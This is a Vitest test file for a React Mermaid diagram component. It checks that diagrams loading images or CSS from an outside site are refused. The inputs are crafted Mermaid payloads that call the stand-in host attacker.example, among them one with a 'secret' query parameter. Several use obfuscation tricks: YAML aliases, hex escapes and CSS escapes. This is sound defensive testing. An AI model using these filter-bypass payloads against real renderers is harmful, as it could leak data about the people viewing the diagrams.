import { cleanup, render, screen, waitFor } from '@testing-library/react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

type MermaidModule = typeof import('mermaid');

const renderMock = vi.fn();

vi.mock('mermaid', async (importOriginal) => {
  const actual = await importOriginal<MermaidModule>();
  return {
    default: { ...actual.default, render: (...args: unknown[]) => renderMock(...args) },
  };
});

import { clearMermaidSvgCache, MermaidDiagram } from '../MermaidDiagram';

const ATTACKER_HOST = 'attacker.example';
const DRAWN_SVG = '<svg><g><text>Start</text></g></svg>';

beforeEach(() => {
  renderMock.mockReset();
  renderMock.mockResolvedValue({ svg: DRAWN_SVG });
  clearMermaidSvgCache();
});

afterEach(cleanup);

async function failureText(source: string): Promise<string> {
  const { container } = render(<MermaidDiagram source={source} />);
  await waitFor(() => {
    expect(container.querySelector('[data-mermaid="failed"]')).toBeTruthy();
  });
  expect(container.querySelector('.mermaid-source')?.textContent).toBe(source);
  return screen.getByRole('status').textContent ?? '';
}

describe('MermaidDiagram external resources', () => {
  it.each([
    [
      'an image node',
      `flowchart TD\n  A@{ img: "https://${ATTACKER_HOST}/p?d=secret", label: "Chart" }\n  A --> B`,
    ],
    [
      'an image key reached through a YAML alias',
      `flowchart TD\n  A@{ label: &k img, *k : "https://${ATTACKER_HOST}/alias" }`,
    ],
    ['an escaped image key', `flowchart TD\n  A@{ "\\x69mg": "https://${ATTACKER_HOST}/escaped" }`],
    [
      'an image node under front matter',
      `---\nconfig:\n  theme: base\n---\nflowchart TD\n  A@{ img: "//${ATTACKER_HOST}/fm" }`,
    ],
    [
      'a sequence actor icon',
      `sequenceDiagram\n  participant Alice\n  properties Alice: {"icon": "https://${ATTACKER_HOST}/icon"}\n  Alice->>Bob: hi`,
    ],
  ])('refuses to draw %s and never runs the renderer', async (_label, source) => {
    expect(await failureText(source)).toContain(`it loads an image from ${ATTACKER_HOST}`);
    expect(renderMock).not.toHaveBeenCalled();
  });

  it.each([
    [
      'a theme stylesheet directive',
      `%%{init: {"themeCSS": "background-image: url(https://${ATTACKER_HOST}/d)"}}%%\nflowchart TD\n  A --> B`,
    ],
    [
      'an escaped front matter stylesheet',
      `---\nconfig:\n  themeCSS: "background-image: \\x75rl(https://${ATTACKER_HOST}/f)"\n---\nflowchart TD\n  A --> B`,
    ],
    [
      'a css-escaped class definition',
      `flowchart TD\n  A --> B\n  classDef c background-image:\\75 rl(https://${ATTACKER_HOST}/c)\n  class A c`,
    ],
    [
      'an image-set node style',
      `flowchart TD\n  A --> B\n  style A mask-image:image-set("https://${ATTACKER_HOST}/s" 1x)`,
    ],
  ])('refuses to draw %s', async (_label, source) => {
    expect(await failureText(source)).toContain('it loads content from another site');
    expect(renderMock).not.toHaveBeenCalled();
  });

  it('draws a diagram whose image is embedded in it', async () => {
    const { container } = render(
      <MermaidDiagram
        source={'flowchart TD\n  A@{ img: "data:image/png;base64,iVBORw0KGgo=" }\n  A --> B'}
      />,
    );

    await waitFor(() => {
      expect(container.querySelector('[data-mermaid="ready"] svg')).toBeTruthy();
    });
    expect(renderMock).toHaveBeenCalledOnce();
  });

  it('draws an ordinary diagram', async () => {
    const { container } = render(
      <MermaidDiagram source={'sequenceDiagram\n  Alice->>Bob: Hello\n  Bob-->>Alice: Hi'} />,
    );

    await waitFor(() => {
      expect(container.querySelector('[data-mermaid="ready"] svg')).toBeTruthy();
    });
    expect(renderMock).toHaveBeenCalledOnce();
  });
});
